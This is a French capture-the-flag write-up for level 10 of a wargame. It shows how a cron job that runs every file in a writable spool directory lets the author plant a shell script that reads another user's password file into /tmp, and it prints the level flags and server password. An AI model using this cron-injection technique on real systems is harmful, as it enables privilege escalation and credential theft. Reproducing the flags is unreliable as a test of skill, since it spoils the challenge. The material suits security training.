# Write up : Wargames

### Level 10  


Consigne :

```
Dernier challenge du wargame !<br>

Consigne lvl10 :<br>
L'administrateur a créé la tâche cron suivante. Celle-ci s'exécute en tant qu'utilisateur challenge11.<p>
   
&nbsp;&nbsp;&nbsp;cat /var/spool/cron/crontabs/challenge11<br>
       &nbsp;&nbsp;&nbsp;* * * * * /usr/bin/script_challenge10.sh<p>

Trouver la vulnérabilité.<br>    


Se connecter à l'adresse suivante : <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT COLOR="#ff0000">ssh -p 6666 challenge10@game1.marshack.fr</FONT> <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password : [flag obtenu dans l'épreuve précédente]
```

Connexion

```
ssh -p 6666 challenge10@game1.marshack.fr
password: MARS{PDaJS6MkwQMd5N5o5ILQld0Ue1mxm90T}
```



Analyse de la tâche cron 

```
* * * * * /usr/bin/script_challenge10.sh
```

Cette tâche exécute le programme /usr/bin/script_challenge10.sh toutes les minutes.



Visualiser droits et permissions

```
challenge10@be9f0e178887:~$ ls -l /usr/bin/script_challenge10.sh
-r-xr-xr-- 1 root challenge11     273 Jan 18 20:11 script_challenge10.sh
```

Analyse

-   challenge10 :  peut lire le fichier (mais pas l'exécuter)

-   challenge11 :  peut lire et exécuter le fichier



Affichage du fichier /usr/bin/script_challenge10.sh

```
challenge10@be9f0e178887:~$ cat /usr/bin/script_challenge10.sh 

#!/bin/bash

cd /var/spool/challenge11
echo "Executing and deleting all scripts in /var/spool/challenge11:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        /usr/bin/timeout -s 9 30 ./$i
        /bin/rm -Rf ./$i
    fi
done


```

Analyse du programme

   Le programme exécute une boucle qui :
- ​    exécute tous les scripts qui se trouvent dans /var/spool/challenge11
- ​    tue la tache si le script s'exécute en arrière-plan
- ​    efface tous les programmes contenus dans /var/spool/challenge11



Visualiser droits et permissions répertoire /var/spool/challenge11

```
challenge10@be9f0e178887:~$ ls -l /var/spool

drwxr-xr-x 1 root        root        4096 Jan 18 22:22 .
drwxrwx--- 1 challenge11 challenge10 4096 Jan 18 22:22 challenge11

```

 Analyse

- ​    challenge11
  - propriétaire du dossier
  - autorisé à éxécuter du contenu
  - autorisé à lire et supprimer du contenu
- ​    challenge10: 
  -  autorisé à lire le contenu
  - autorisé à écrire un fichier et/ou un dossier
  - autorisé à traverser le dossier


On s'aperçoit donc que challenge10 peut créer un script et le déposer dans le dossier /var/spool/challenge11 

Le script sera exécuté par la tâche *cron* sous l'utilisateur challenge11 et devra  :

- lire le contenu de /etc/wargames_pass/level11/level11_password
- exporter le flag dans le répertoire /tmp/test/

```
challenge10@7051d181892c:~$ mkdir /tmp/test
challenge10@7051d181892c:~$ chmod 777 /tmp/test
challenge10@7051d181892c:~$ vi /tmp/test/payload.sh
#!/bin/sh
cat /etc/wargames_pass/level11/level11_password > /tmp/test/flag

challenge10@7051d181892c:~$ chmod 777 /tmp/test/payload.sh
challenge10@7051d181892c:~$ cp -p /tmp/test/payload.sh /var/spool/challenge11/payload.sh

```
Attendre 1 minute

Le répertoire doit contenir le fichier /tmp/test/flag contenant le flag

```
challenge10@7051d181892c:~$ cat /tmp/test/flag
```


Résultat : MARS{5u3FphfyJKqmP44eTgVGr5r6XiSmmcWf}